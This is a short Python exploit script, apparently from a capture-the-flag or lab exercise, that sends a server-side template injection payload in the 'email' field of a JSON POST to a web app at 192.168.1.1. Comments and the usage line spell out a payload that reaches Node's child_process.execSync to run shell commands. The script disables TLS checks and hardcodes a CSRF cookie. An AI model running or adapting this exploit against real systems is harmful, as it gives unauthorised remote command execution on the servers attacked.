#!/usr/bin/env python3

import requests
import sys
import re


cookies = {
    '_csrf': '1oz9RFN-k24hQEmRGgXgJohC',
}

headers = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://192.168.1.1/',
    'Content-Type': 'application/json',
    'Origin': 'https://192.168.1.1',
    'Content-Length': '22',
    'Connection': 'close',
}

#data = '{"email":"{{range.constructor(\\"return global.process.mainModule.require(\'child_process\').execSync(\'id\')\\")()}}"}'
#payload = "{{range.constructor(\\\"return global.process.mainModule.require(\'child_process\').execSync(\'id\')\\\")()}}"
payload = sys.argv[1]
data = "{"+f'"email":"{payload}"'+"}"
#data = "{"+data+"}"
print(data)

response = requests.post('https://192.168.1.1/api/submit', headers=headers, cookies=cookies, data=data, verify=False)
response = re.search(r'address: (.*)',response.text).group(1)[:-3]
print("\n",response)

#Usage is as follows:
# python3 ssti.py "{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('id')\\\")()}}"
